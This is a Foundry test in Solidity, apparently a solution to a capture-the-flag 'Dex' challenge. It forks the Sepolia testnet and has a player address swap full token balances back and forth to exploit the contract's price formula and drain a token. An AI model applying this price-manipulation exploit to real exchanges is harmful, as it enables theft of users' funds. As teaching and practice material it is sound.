// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface Dex {
    function swap(address from, address to, uint256 amount) external;

    function token1() external view returns (address);

    function token2() external view returns (address);

    function approve(address spender, uint256 amount) external;

    function getSwapPrice(
        address from,
        address to,
        uint256 amount
    ) external view returns (uint256);
}

contract DexAttackerTest is Test {
    Dex dex;
    IERC20 token1;
    IERC20 token2;

    address player = 0x6278A1E803A76796a3A1f7F6344fE874ebfe94B2;

    function setUp() external {
        // 配置 fork url; SEPOLIA_RPC_URL 为 .env 文件中的环境变量
        uint256 forkId = vm.createFork(
            vm.envString("SEPOLIA_RPC_URL"),
            6337400
        );
        vm.selectFork(forkId);

        dex = Dex(0x3fCE4Eb607faf7f690ec53C1593D8c01C5534cE1);
        token1 = IERC20(dex.token1());
        token2 = IERC20(dex.token2());
    }

    function testInfo() external view {
        console.log("token1: ", address(token1));
        console.log("token2: ", address(token2));
    }

    function testSwap() external {
        vm.startPrank(player);
        dex.approve(address(dex), UINT256_MAX);

        uint256 price1 = dex.getSwapPrice(
            address(token1),
            address(token2),
            token1.balanceOf(player)
        );
        console.log("token2: ", price1);

        dex.swap(address(token1), address(token2), token1.balanceOf(player));
        uint256 price2 = dex.getSwapPrice(
            address(token2),
            address(token1),
            token2.balanceOf(player)
        );
        console.log("token1: ", price2);
        dex.swap(address(token2), address(token1), token2.balanceOf(player));
        uint256 price3 = dex.getSwapPrice(
            address(token1),
            address(token2),
            token1.balanceOf(player)
        );
        console.log("token2: ", price3);
        dex.swap(address(token1), address(token2), token1.balanceOf(player));
        uint256 price4 = dex.getSwapPrice(
            address(token2),
            address(token1),
            token2.balanceOf(player)
        );
        console.log("token1: ", price4);

        dex.swap(address(token2), address(token1), token2.balanceOf(player));
        uint256 price5 = dex.getSwapPrice(
            address(token1),
            address(token2),
            token1.balanceOf(player)
        );
        console.log("token2: ", price5);
        dex.swap(address(token1), address(token2), token1.balanceOf(player));
        uint256 price6 = dex.getSwapPrice(address(token2), address(token1), 45);
        console.log("token1: ", price6);
        dex.swap(address(token2), address(token1), 45);

        vm.stopPrank();
    }
}

// forge test --match-contract DexAttackerTest -vvv
